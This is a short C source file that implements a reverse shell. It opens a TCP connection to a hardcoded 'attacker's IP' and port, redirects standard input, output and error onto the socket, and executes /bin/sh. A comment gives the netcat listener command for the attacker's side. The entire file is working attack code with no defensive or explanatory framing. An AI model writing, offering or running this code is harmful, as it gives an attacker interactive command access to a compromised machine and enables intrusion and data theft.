#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

// Attacker's IP address and port
#define HOST "10.27.51.175"
#define PORT 1234

// For the server, run "nc -lvp 1234" in attacker's
// terminal
int main()
{
    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = inet_addr(HOST),
        .sin_port = htons(PORT)
    };

    int s = socket(AF_INET, SOCK_STREAM, 0);

    connect(s, (struct sockaddr*) &sa, sizeof(sa));

    dup2(s, 0); // stdin
    dup2(s, 1); // stdout
    dup2(s, 2); // stderr

    execve("/bin/sh", NULL, NULL);

    return 0;
}
